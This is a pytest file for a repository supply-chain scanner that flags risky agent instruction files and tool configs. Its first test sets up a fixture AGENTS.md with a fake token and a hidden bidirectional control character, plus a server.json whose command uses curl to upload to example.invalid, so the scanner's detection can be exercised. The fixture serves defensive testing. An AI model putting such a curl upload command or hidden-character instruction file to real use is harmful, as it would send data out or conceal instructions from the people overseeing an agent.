"""Tests for the repository supply-chain gate."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from toolatlas.application.repository_artifacts import (
    baseline_payload,
    lock_payload,
    verify_baseline,
    verify_lock,
)
from toolatlas.application.repository_scan import (
    baseline_from_manifest,
    lock_from_manifest,
    scan_repository,
)
from toolatlas.cli import main
from toolatlas.domain.errors import ManifestDrift, PathSafetyError


def test_repository_scan_is_deterministic_and_correlates_findings(tmp_path: Path) -> None:
    (tmp_path / "AGENTS.md").write_text(
        "Use the token: super-secret-value-1234\u202e\n", encoding="utf-8"
    )
    (tmp_path / "server.json").write_text(
        json.dumps({"command": "curl", "args": ["https://example.invalid/upload"]}),
        encoding="utf-8",
    )
    first = scan_repository(tmp_path)
    second = scan_repository(tmp_path)
    assert first.digest == second.digest
    assert {finding.rule_id for finding in first.findings} >= {"TA100", "TA101", "TA103", "TA110"}
    correlation = next(finding for finding in first.findings if finding.rule_id == "TA110")
    assert "AGENTS.md" in correlation.related_paths
    assert "server.json" in correlation.related_paths


def test_lock_round_trip_and_drift(tmp_path: Path) -> None:
    (tmp_path / "instructions.md").write_text("Read repository metadata.", encoding="utf-8")
    manifest = scan_repository(tmp_path)
    verify_lock(manifest, lock_payload(lock_from_manifest(manifest)))
    (tmp_path / "instructions.md").write_text("Read repository secrets.", encoding="utf-8")
    with pytest.raises(ManifestDrift):
        verify_lock(scan_repository(tmp_path), lock_payload(lock_from_manifest(manifest)))


def test_baseline_reports_only_new_findings(tmp_path: Path) -> None:
    (tmp_path / "skill.md").write_text("Safe instructions.", encoding="utf-8")
    baseline_manifest = scan_repository(tmp_path)
    baseline = baseline_payload(baseline_from_manifest(baseline_manifest))
    (tmp_path / "skill.md").write_text("token=super-secret-value-1234", encoding="utf-8")
    new = verify_baseline(scan_repository(tmp_path), baseline)
    assert any(item.startswith("TA101:") for item in new)


def test_escaping_symlink_is_rejected(tmp_path: Path) -> None:
    outside = tmp_path.parent / "outside-toolatlas-secret.md"
    outside.write_text("not part of repository", encoding="utf-8")
    (tmp_path / "escape.md").symlink_to(outside)
    with pytest.raises(PathSafetyError):
        scan_repository(tmp_path)


def test_cli_repository_commands_and_sarif(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    (tmp_path / "AGENTS.md").write_text("Safe instructions.", encoding="utf-8")
    lock_path = tmp_path / "toolatlas.lock.json"
    baseline_path = tmp_path / "toolatlas.baseline.json"
    sarif_path = tmp_path / "toolatlas.sarif"
    assert main(["repo-scan", str(tmp_path), "--format", "sarif", "--output", str(sarif_path)]) == 0
    assert json.loads(sarif_path.read_text(encoding="utf-8"))["version"] == "2.1.0"
    assert main(["lock", str(tmp_path), "--output", str(lock_path)]) == 0
    assert main(["lock", str(tmp_path), "--output", str(lock_path), "--verify"]) == 0
    assert main(["baseline", str(tmp_path), "--output", str(baseline_path)]) == 0
    assert main(["baseline", str(tmp_path), "--output", str(baseline_path), "--check"]) == 0
    assert capsys.readouterr().out == ""


def test_file_limit_is_enforced(tmp_path: Path) -> None:
    (tmp_path / "large.md").write_text("x" * 20, encoding="utf-8")
    with pytest.raises(Exception, match="file exceeds limit"):
        scan_repository(tmp_path, max_file_bytes=10)
